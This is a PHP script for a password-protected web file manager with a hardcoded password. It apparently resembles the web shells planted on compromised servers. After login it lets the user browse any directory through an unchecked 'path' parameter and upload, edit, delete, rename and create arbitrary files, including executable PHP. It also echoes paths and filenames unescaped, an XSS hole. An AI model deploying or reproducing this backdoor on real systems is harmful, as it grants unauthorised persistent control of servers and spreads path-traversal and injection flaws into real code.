<?php
session_start();

// Password Settings - Change these as needed
define('PASSWORD', 'emangiya'); // Change this password
define('SESSION_TIMEOUT', 1800); // 30 minutes

// Check if user is logged in
function checkLogin() {
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        return false;
    }
    
    // Check session timeout
    if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > SESSION_TIMEOUT)) {
        session_unset();
        session_destroy();
        return false;
    }
    
    $_SESSION['last_activity'] = time();
    return true;
}

// Handle login form submission
function handleLogin() {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if ($_POST['password'] === PASSWORD) {
            $_SESSION['logged_in'] = true;
            $_SESSION['last_activity'] = time();
            return true;
        } else {
            echo "<p style='color: red;'>Incorrect password!</p>";
            return false;
        }
    }
    return false;
}

// Display login form
function showLoginForm() {
    echo '
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Required</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                background: #f0f0f0; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                height: 100vh; 
                margin: 0; 
            }
            .login-container { 
                background: white; 
                padding: 40px; 
                border-radius: 10px; 
                box-shadow: 0 0 10px rgba(0,0,0,0.1); 
                text-align: center; 
            }
            input[type="password"] { 
                padding: 10px; 
                margin: 10px 0; 
                width: 200px; 
                border: 1px solid #ddd; 
                border-radius: 5px; 
            }
            button { 
                padding: 10px 20px; 
                background: #007bff; 
                color: white; 
                border: none; 
                border-radius: 5px; 
                cursor: pointer; 
            }
            button:hover { 
                background: #0056b3; 
            }
            .logout-btn {
                background: #dc3545;
                margin-left: 10px;
            }
            .logout-btn:hover {
                background: #c82333;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Login Required</h2>
            <form method="POST">
                <input type="password" name="password" placeholder="Enter password" required>
                <br>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>';
    exit();
}

// Handle logout
function handleLogout() {
    if (isset($_GET['logout'])) {
        session_unset();
        session_destroy();
        header('Location: ' . str_replace('?logout=1', '', $_SERVER['REQUEST_URI']));
        exit();
    }
}

// Check authentication
handleLogout();
if (!checkLogin()) {
    if (!handleLogin()) {
        showLoginForm();
    }
}

// Original file manager code continues below...
$currentDirectory = $_GET['path'] ?? __DIR__;

function listDirectoryContents($directory) {
    $entries = array_diff(scandir($directory), ['.', '..']);
    echo "<h3>Current Directory: $directory</h3><ul>";
    foreach ($entries as $entry) {
        $absolutePath = realpath("$directory/$entry");
        $style = determineItemStyle($absolutePath);
        $isDirectory = is_dir($absolutePath);

        echo "<li style='$style'>";
        if ($isDirectory) {
            echo "<a href='?path=$absolutePath'>📁 $entry</a>";
        } else {
            echo "📄 $entry - 
                <a href='?path=$directory&task=modify&item=$entry'>Modify</a> | 
                <a href='?path=$directory&task=remove&item=$entry' onclick='return confirm(\"Are you sure?\")'>Remove</a> | 
                <a href='?path=$directory&task=rename&item=$entry'>Rename</a>";
        }
        echo "</li>";
    }
    echo "</ul>";
}

function determineItemStyle($path) {
    if (is_readable($path) && is_writable($path)) {
        return "color: green;";
    }
    return is_writable($path) ? "color: gray;" : "color: red;";
}

function processFileUpload($directory) {
    if (!empty($_FILES['fileUpload'])) {
        $destination = $directory . DIRECTORY_SEPARATOR . basename($_FILES['fileUpload']['name']);
        if (move_uploaded_file($_FILES['fileUpload']['tmp_name'], $destination)) {
            echo "<p style='color: green;'>File uploaded successfully!</p>";
        } else {
            echo "<p style='color: red;'>File upload failed.</p>";
        }
    }
}

function addFolder($directory) {
    $folderName = $_POST['folder'] ?? '';
    if ($folderName) {
        $folderPath = $directory . DIRECTORY_SEPARATOR . $folderName;
        if (!file_exists($folderPath)) {
            mkdir($folderPath);
            echo "<p style='color: green;'>Folder created: $folderName</p>";
        } else {
            echo "<p style='color: orange;'>Folder already exists.</p>";
        }
    }
}

function addFile($directory) {
    $fileName = $_POST['file'] ?? '';
    if ($fileName) {
        $filePath = $directory . DIRECTORY_SEPARATOR . $fileName;
        if (!file_exists($filePath)) {
            file_put_contents($filePath, '');
            echo "<p style='color: green;'>File created: $fileName</p>";
        } else {
            echo "<p style='color: orange;'>File already exists.</p>";
        }
    }
}

function modifyFile($filePath) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($filePath, $_POST['content']);
        echo "<p style='color: green;'>File saved successfully!</p>";
    }
    $content = file_exists($filePath) ? htmlspecialchars(file_get_contents($filePath)) : '';
    echo "<form method='POST'><textarea name='content' style='width:100%; height:300px;'>$content</textarea><br>";
    echo "<button type='submit'>Save</button></form>";
}

function removeFile($filePath) {
    if (file_exists($filePath)) {
        unlink($filePath);
        echo "<p style='color: green;'>File removed.</p>";
    }
}

function renameFile($filePath) {
    if (!empty($_POST['newName'])) {
        $newFilePath = dirname($filePath) . DIRECTORY_SEPARATOR . $_POST['newName'];
        rename($filePath, $newFilePath);
        echo "<p style='color: green;'>File renamed successfully.</p>";
    } else {
        echo "<form method='POST'><input type='text' name='newName' placeholder='New Name'><button type='submit'>Rename</button></form>";
    }
}

// Handle file operations
if (!empty($_GET['task']) && !empty($_GET['item'])) {
    $itemPath = $currentDirectory . DIRECTORY_SEPARATOR . $_GET['item'];
    switch ($_GET['task']) {
        case 'modify':
            modifyFile($itemPath);
            break;
        case 'remove':
            removeFile($itemPath);
            break;
        case 'rename':
            renameFile($itemPath);
            break;
    }
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileUpload'])) {
        processFileUpload($currentDirectory);
    } elseif (!empty($_POST['folder'])) {
        addFolder($currentDirectory);
    } elseif (!empty($_POST['file'])) {
        addFile($currentDirectory);
    }
}

// Display the file manager interface
echo "<div style='padding: 20px;'>";
echo "<h1>File Manager <a href='?logout=1' class='logout-btn' style='color: white; text-decoration: none; padding: 5px 10px; border-radius: 3px;'>Logout</a></h1>";

echo "<a href='?path=" . dirname($currentDirectory) . "'>⬆️ Go Up</a>";
listDirectoryContents($currentDirectory);

echo "<h3>Upload File</h3><form method='POST' enctype='multipart/form-data'><input type='file' name='fileUpload'><button type='submit'>Upload</button></form>";
echo "<h3>Create Folder</h3><form method='POST'><input type='text' name='folder' placeholder='Folder Name'><button type='submit'>Create</button></form>";
echo "<h3>Create File</h3><form method='POST'><input type='text' name='file' placeholder='File Name'><button type='submit'>Create</button></form>";

echo "</div>";
?>